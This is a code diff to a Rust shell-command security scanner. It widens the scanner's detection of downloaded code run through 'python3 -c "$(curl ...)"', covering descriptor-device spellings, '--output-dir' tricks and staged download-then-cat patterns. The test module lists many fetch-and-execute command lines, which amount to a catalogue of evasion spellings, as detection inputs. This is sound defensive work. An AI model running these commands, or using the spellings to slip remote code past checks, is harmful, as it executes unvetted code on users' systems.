@@ -7058,7 +7058,20 @@ fn find_released_inline_program<'a>(
 
 /// File names that write to the process's own standard output.
 fn names_standard_output(path: &str) -> bool {
-    matches!(path, "/dev/stdout" | "/dev/fd/1" | "/proc/self/fd/1")
+    crate::extract::names_standard_stream(path, 1)
+}
+
+/// The descriptor an output redirection target opens when it is one of the
+/// process's own descriptor device files (`/dev/stdout`, `/dev/stderr`,
+/// `/dev/fd/N`, `/proc/self/fd/N`, `/proc/thread-self/fd/N`, in any spelling
+/// [`crate::extract::names_standard_stream`] accepts). `None` for a file.
+fn device_descriptor(target: &str) -> Option<u8> {
+    match crate::extract::standard_stream_device(target)? {
+        crate::extract::StreamDevice::Named(0) => None,
+        crate::extract::StreamDevice::Named(fd) | crate::extract::StreamDevice::Numbered(fd) => {
+            u8::try_from(fd).ok()
+        }
+    }
 }
 
 /// One curl transfer: a URL and an output instruction each fill the first
@@ -7080,6 +7093,10 @@ struct CurlTransferOutputs {
     remote_name_all: bool,
     /// A `-K` config file can add URLs whose output argv cannot show.
     config: bool,
+    /// `--output-dir` names a device directory (`/dev`, `/proc/...`) or a
+    /// value tirith cannot read: every output file of the group may then be
+    /// a descriptor device (`--output-dir /dev -o stdout`).
+    device_output_dir: bool,
 }
 
 impl CurlTransferOutputs {
@@ -7106,10 +7123,10 @@ impl CurlTransferOutputs {
 
     fn emits_stdout(&self) -> bool {
         self.config
-            || self
-                .transfers
-                .iter()
-                .any(|transfer| transfer.url && transfer.output.unwrap_or(!transfer.remote_name))
+            || self.transfers.iter().any(|transfer| {
+                transfer.url
+                    && (self.device_output_dir || transfer.output.unwrap_or(!transfer.remote_name))
+            })
     }
 }
 
@@ -7117,8 +7134,43 @@ impl CurlTransferOutputs {
 enum CurlTransferValue {
     Url,
     Output { expanded: bool },
+    OutputDir,
     Config,
     Other,
+}
+
+/// Whether a curl `--output-dir` value may put output files on a descriptor
+/// device: a `/dev` or `/proc` directory, or a value that is not a literal.
+fn curl_output_dir_may_be_device(raw: &str, value: &str) -> bool {
+    let literal = command_word_is_statically_bound(raw, ShellType::Posix)
+        && (!raw.contains('`') || parse_posix_shell_word(raw).substitutions.is_empty());
+    let resolved = if literal {
+        value.to_string()
+    } else {
+        match evaluated_literal(raw, ShellType::Posix) {
+            Ok(resolved) => resolved,
+            Err(()) => return true,
+        }
+    };
+    if resolved.contains(['*', '?', '[', '{', '$', '`']) {
+        return true;
+    }
+    if !resolved.starts_with('/') {
+        // A relative directory stays below the working directory unless a
+        // `..` climbs out of it (enough of them reach `/dev` from anywhere).
+        return resolved.split('/').any(|part| part == "..");
+    }
+    let mut parts: Vec<&str> = Vec::new();
+    for part in resolved.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                parts.pop();
+            }
+            part => parts.push(part),
+        }
+    }
+    matches!(parts.first(), Some(&"dev" | &"proc"))
 }
 
 fn curl_transfer_value(
@@ -7150,6 +7202,9 @@ fn curl_transfer_value(
                 })
             };
             group.output(stdout || (expanded && value.contains("{{")));
+        }
+        CurlTransferValue::OutputDir => {
+            group.device_output_dir |= curl_output_dir_may_be_device(raw, value);
         }
         CurlTransferValue::Config => group.config = true,
         CurlTransferValue::Other => {}
@@ -7201,6 +7256,7 @@ fn curl_emits_download(args: &[String]) -> bool {
                             "output" => CurlTransferValue::Output {
                                 expanded: spelling.starts_with(CURL_EXPAND_OPTION_PREFIX),
                             },
+                            "output-dir" => CurlTransferValue::OutputDir,
                             "config" => CurlTransferValue::Config,
                             _ => CurlTransferValue::Other,
                         };
@@ -7393,6 +7449,9 @@ fn substitution_emits_download(body: &str, shell: ShellType, depth: usize) -> bo
     let (_, segments, _) = bounded_command_analysis_segments(body, shell);
     let mut pipe_download = false;
     let mut completed_download = false;
+    // Files an earlier command of this body downloaded into
+    // (`curl -o /tmp/x.py URL; cat /tmp/x.py`), by staged path key.
+    let mut staged_downloads: Vec<String> = Vec::new();
     for (index, segment) in segments.iter().enumerate() {
         let pipe_connected = matches!(segment.preceding_separator.as_deref(), Some("|" | "|&"));
         if !pipe_connected {
@@ -7430,7 +7489,23 @@ fn substitution_emits_download(body: &str, shell: ShellType, depth: usize) -> bo
                     };
                     output_download = fetch_emits_download(&command, &posix_args)
                         || (routing.stdin == FlowProof::Sensitive
-                            && crate::env_guard::is_data_preserving_transform(&command));
+                            && crate::env_guard::is_data_preserving_transform(&command))
+                        || (!staged_downloads.is_empty()
+                            && reads_staged_download(
+                                &command,
+                                &effective.args,
+                                &args,
+                                shell,
+                                &staged_downloads,
+                            ));
+                    for path in fetch_output_files(&command, &posix_args) {
+                        if staged_downloads.len() >= MAX_STAGED_DATAFLOW_PATHS {
+                            break;
+                        }
+                        if let Ok(key) = staged_path_key(&path, ShellType::Posix) {
+                            staged_downloads.push(key);
+                        }
+                    }
                     if !output_download && nested_output_preserving_command(&command) {
                         let argument_download = args.iter().position(|raw| {
                             word_command_substitutions(raw, shell)
@@ -7461,8 +7536,126 @@ fn substitution_emits_download(body: &str, shell: ShellType, depth: usize) -> bo
             });
         }
         pipe_download = output_download && routing.stdout == FdDestination::ParentStdout;
+        // `curl URL > /tmp/x.py` stages the download in a file too.
+        if output_download
+            && routing.stdout == FdDestination::Other
+            && staged_downloads.len() < MAX_STAGED_DATAFLOW_PATHS
+        {
+            if let Some(key) = segment_stdout_target(segment, shell)
+                .and_then(|(target, _)| staged_path_key(&target, shell).ok())
+            {
+                staged_downloads.push(key);
+            }
+        }
     }
     completed_download || pipe_download
+}
+
+/// The files a fetch command writes its download into: `-o`/`--output`
+/// (curl, HTTPie, xh, fetch) and `-O`/`--output-document` (wget) values, and
+/// the URL basename for curl `-O`/`--remote-name[-all]` and for wget without
+/// `-O`. Standard-output spellings are excluded (they are not files).
+fn fetch_output_files(command: &str, args: &[String]) -> Vec<String> {
+    if !POSIX_FETCH_COMMANDS.contains(&command) {
+        return Vec::new();
+    }
+    let (long, short, value_options) = match command {
+        "curl" => ("--output", 'o', "AbcCdDeEFhHKmPQrTtUuwxXyYz"),
+        "wget" => ("--output-document", 'O', "aABeIiIloPQRTtUuwWX"),
+        "fetch" => ("--output", 'o', "Ttw"),
+        _ => ("--output", 'o', "a"),
+    };
+    let outputs = crate::rules::install::collect_command_option_values(
+        args,
+        ShellType::Posix,
+        long,
+        short,
+        value_options,
+    );
+    let named_output = !outputs.is_empty();
+    let mut files: Vec<String> = outputs
+        .into_iter()
+        .filter(|path| path != "-" && !names_standard_output(path))
+        .collect();
+    let remote_name = match command {
+        "curl" => args.iter().any(|raw| {
+            let arg = normalize_shell_token(raw, ShellType::Posix);
+            matches!(arg.as_str(), "--remote-name" | "--remote-name-all")
+                || (arg.starts_with('-')
+                    && !arg.starts_with("--")
+                    && arg[1..]
+                        .chars()
+                        .take_while(|flag| !"AbcCdDeEFhHKmoPQrTtUuwxXyYz".contains(*flag))
+                        .any(|flag| flag == 'O'))
+        }),
+        "wget" => !named_output,
+        _ => false,
+    };
+    if remote_name {
+        for url in extract_urls_from_args(args, ShellType::Posix) {
+            let path = url.split(['?', '#']).next().unwrap_or_default();
+            let after_scheme = path.split_once("://").map_or(path, |(_, rest)| rest);
+            if let Some((_, name)) = after_scheme.rsplit_once('/') {
+                if !name.is_empty() {
+                    files.push(name.to_string());
+                }
+            }
+        }
+    }
+    files
+}
+
+/// Whether a reader or data-preserving filter prints a file an earlier
+/// command of the same substitution body downloaded (`cat /tmp/x.py`, or
+/// `gunzip < /tmp/x.gz`).
+fn reads_staged_download(
+    command: &str,
+    raw_args: &[String],
+    args: &[String],
+    shell: ShellType,
+    staged: &[String],
+) -> bool {
+    if !(is_dataflow_reader(command)
+        || crate::env_guard::is_data_preserving_transform(command)
+        || matches!(
+            command,
+            "tac" | "less" | "nl" | "rev" | "cut" | "sort" | "uniq"
+        ))
+    {
+        return false;
+    }
+    let is_staged = |raw: &str| {
+        staged_path_key(raw, shell)
+            .ok()
+            .is_some_and(|key| staged.contains(&key))
+    };
+    // File operands (options are skipped; a value that happens to equal a
+    // staged path only widens the check).
+    if args
+        .iter()
+        .filter(|raw| !normalize_shell_token(raw, shell).starts_with('-'))
+        .any(|raw| is_staged(raw))
+    {
+        return true;
+    }
+    // Standard input redirected from the staged file.
+    let mut words = raw_args.iter();
+    while let Some(word) = words.next() {
+        if word == "<" || word == "0<" {
+            if words.next().is_some_and(|target| is_staged(target)) {
+                return true;
+            }
+        } else if let Some(target) = word
+            .strip_prefix("0<")
+            .or_else(|| word.strip_prefix('<'))
+            .filter(|target| !target.is_empty() && !target.starts_with(['<', '(', '&']))
+        {
+            if is_staged(target) {
+                return true;
+            }
+        }
+    }
+    false
 }
 
 const MAX_SHELL_DATAFLOW_WORD_BYTES: usize = 64 * 1024;
@@ -10397,14 +10590,7 @@ fn ordered_fd_routing(
             let device_fd = target
                 .as_deref()
                 .map(|target| normalize_shell_token(target, shell))
-                .and_then(|target| match target.as_str() {
-                    "/dev/stdout" => Some(1),
-                    "/dev/stderr" => Some(2),
-                    _ => target
-                        .strip_prefix("/dev/fd/")
-                        .or_else(|| target.strip_prefix("/proc/self/fd/"))
-                        .and_then(|number| number.parse::<u8>().ok()),
-                });
+                .and_then(|target| device_descriptor(&target));
             let destination = device_fd.map_or(FdDestination::Other, |device_fd| {
                 descriptors
                     .get(&device_fd)
@@ -20793,5 +20979,68 @@ mod inline_program_tests {
         );
         assert_eq!(operands("php -f run.php"), vec!["run.php".to_string()]);
         assert!(operands("php -r 'echo 1;'").is_empty());
+    }
+}
+
+#[cfg(test)]
+mod download_spelling_tests {
+    use super::*;
+
+    fn rules(input: &str, shell: ShellType) -> Vec<RuleId> {
+        check(input, shell, None, ScanContext::Exec)
+            .into_iter()
+            .map(|finding| finding.rule_id)
+            .collect()
+    }
+
+    /// CORE-3: download spellings that print to standard output, a device
+    /// `--output-dir`, the clobbering `>|` redirection and a file downloaded
+    /// and printed in the same substitution are downloaded program source.
+    #[test]
+    fn more_stdout_spellings_and_staged_downloads_are_downloaded_source() {
+        for input in [
+            "python3 -c \"$(curl -o /dev//stdout https://example.com/x.py)\"",
+            "python3 -c \"$(curl -o /dev/./stdout https://example.com/x.py)\"",
+            "python3 -c \"$(curl -o /dev/fd/01 https://example.com/x.py)\"",
+            "python3 -c \"$(curl -o /proc/thread-self/fd/1 https://example.com/x.py)\"",
+            "python3 -c \"$(curl -o /tmp/../dev/stdout https://example.com/x.py)\"",
+            "python3 -c \"$(curl --output-dir /dev -o stdout https://example.com/x.py)\"",
+            "python3 -c \"$(curl --output-dir ../../../../../../dev -o stdout https://example.com/x.py)\"",
+            "python3 -c \"$(curl --output-dir \"$D\" -o x https://example.com/x.py)\"",
+            "python3 -c \"$(curl https://example.com/x.py >|/dev/stdout)\"",
+            "python3 -c \"$(curl https://example.com/x.py -o /tmp/x.py; cat /tmp/x.py)\"",
+            "python3 -c \"$(curl https://example.com/x.py -o /tmp/x.py && cat /tmp/x.py)\"",
+            "python3 -c \"$(curl -fsSL https://example.com/x.py > /tmp/x.py; cat /tmp/x.py)\"",
+            "python3 -c \"$(wget -q https://example.com/x.py && cat ./x.py)\"",
+            "python3 -c \"$(curl -sO https://example.com/x.py; cat x.py)\"",
+            "python3 -c \"$(curl -o /tmp/x.gz https://example.com/x.gz; gunzip < /tmp/x.gz)\"",
+        ] {
+            assert!(
+                rules(input, ShellType::Posix).contains(&RuleId::InterpreterSuspiciousInlineExec),
+                "{input}"
+            );
+        }
+        for input in [
+            "python3 -c \"$(curl -s -o /tmp/x.py https://example.com/x.py)\"",
+            "python3 -c \"$(curl --output-dir /tmp/dl -o x.py https://example.com/x.py)\"",
+            "python3 -c \"$(curl -o /tmp/x.py https://example.com/x.py; cat /tmp/other.py)\"",
+            "python3 -c \"$(cat /tmp/x.py)\"",
+        ] {
+            assert!(
+                !rules(input, ShellType::Posix).contains(&RuleId::InterpreterSuspiciousInlineExec),
+                "{input}"
+            );
+        }
+    }
+
+    #[test]
+    fn device_descriptor_spellings() {
+        assert_eq!(device_descriptor("/dev/stdout"), Some(1));
+        assert_eq!(device_descriptor("/dev//stderr"), Some(2));
+        assert_eq!(device_descriptor("/proc/thread-self/fd/03"), Some(3));
+        assert_eq!(device_descriptor("/dev/stdin"), None);
+        assert_eq!(device_descriptor("/tmp/out"), None);
+        assert!(names_standard_output("/dev/./fd/1"));
+        assert!(!names_standard_output("/dev/fd/10"));
     }
 }
